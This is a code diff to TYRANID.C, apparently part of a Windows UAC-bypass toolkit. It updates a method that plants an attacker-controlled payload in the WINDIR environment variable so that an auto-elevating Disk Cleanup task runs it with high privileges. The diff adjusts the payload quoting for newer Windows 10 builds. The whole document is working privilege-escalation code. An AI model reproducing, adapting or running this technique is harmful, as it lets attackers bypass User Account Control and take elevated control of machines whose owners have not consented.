@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2020
+*  (C) COPYRIGHT AUTHORS, 2017 - 2025
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.54
+*  VERSION:     3.67
 *
-*  DATE:        24 Nov 2020
+*  DATE:        04 Feb 2025
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -130,24 +130,30 @@ NTSTATUS ucmDiskCleanupEnvironmentVariable(
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
 
     WCHAR   szEnvVariable[MAX_PATH * 2];
+    PWCHAR  psz;
+    BOOL    quoteFix;
 
     do {
 
         if (_strlen(lpszPayload) > MAX_PATH)
             return STATUS_INVALID_PARAMETER;
 
+        RtlSecureZeroMemory(szEnvVariable, sizeof(szEnvVariable));
+        quoteFix = (g_ctx->dwBuildNumber >= NT_WIN10_21H2);
+
         //
         // Add quotes.
         //
         szEnvVariable[0] = L'\"';
-        szEnvVariable[1] = 0;
+        psz = &szEnvVariable[!!quoteFix];
+
         _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
         _strcat(szEnvVariable, L"\"");
 
         //
         // Set our controlled env.variable with payload.
         //
-        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, szEnvVariable))
+        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, psz))
             break;
 
         //
